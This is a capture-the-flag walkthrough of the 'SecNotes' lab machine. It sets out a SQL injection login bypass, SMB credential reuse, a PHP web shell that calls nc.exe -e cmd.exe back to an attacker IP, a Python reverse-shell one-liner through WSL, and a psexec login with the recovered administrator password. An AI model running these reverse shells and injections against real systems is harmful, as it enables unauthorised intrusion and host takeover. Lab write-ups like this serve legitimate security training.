# SecNotes

## Summary

* Only three ports were open: `80` (web), `445` (SMB), and `8808` (IIS default page).
* The main site (`/login.php`) hosted a note-taking app vulnerable to **SQL injection** and **CSRF**.
* Exploited SQLi via the registration form to gain access as admin by using `'OR 1 OR'` as the username.
* Retrieved SMB credentials for user `tyler` from the admin dashboard.
* With SMB access, uploaded a **reverse shell using `nc.exe`** to the writable `new-site` share.
* Got initial shell via **browser-based trigger** of the uploaded PHP payload.
* Privilege escalation was achieved using **WSL abuse** — the `bash.exe` binary was found, and we obtained a root shell through reverse shell from WSL.
* `bash_history` revealed Administrator credentials.
* Used `psexec` with Administrator creds to get SYSTEM access.



***

## Enumeration

```bash
nmap -p- -T5 10.10.10.97 -vv
sudo nmap -sC -sN -A -oN full.nmap -p80,135,139,445,8808 10.10.10.97
```

Discovered:

* Port 80: `Secure Notes` login panel (`login.php`)
* Port 8808: Default IIS page
* Port 445: SMB with `new-site` share (eventually writable)

***

## Initial Foothold

#### Web App (Port 80)

**SQL Injection on Sign-Up page:**

```bash
# Registration payload
Username: 'OR 1 OR'
Password: anything
```

Logged in as admin and saw notes containing the following credentials:

```
Username: tyler
Password: <FINDIT!>
```

***

#### SMB Enumeration

```bash
crackmapexec smb 10.10.10.97 -u 'tyler' -p <FINDIT!> --shares

# Result:
new-site - READ,WRITE
```

Uploaded reverse shell via SMB:

* `nc.exe`
* PHP shell to execute `nc.exe -e cmd.exe`

Then triggered it from browser:

```php
<?php system("nc.exe -e cmd.exe 10.10.16.2 8888"); ?>
```

Listener:

```bash
nc -lvnp 8888
```

**Shell obtained!**

***

## Privilege Escalation

#### WSL Abuse

Located WSL:

```powershell
where /R C:\windows bash.exe
# Found at:
C:\Windows\WinSxS\...\bash.exe
```

Checked current WSL user:

```bash
wsl whoami
# Output:
root
```

Spawned root shell via reverse connection from WSL:

```bash
# Listener
nc -lvnp 9999

# Command on target:
wsl python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.16.2",9999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

Escaped limited shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

**Looted `.bash_history` → Revealed Administrator SMB credentials:**

```
Username: administrator
Password: u6!4ZwgwOM#^OBf#Nwnh
```

***

#### SYSTEM Shell via psexec

```bash
impacket-psexec SECNOTES/administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
```

**Boom! Got SYSTEM access and root flag.**

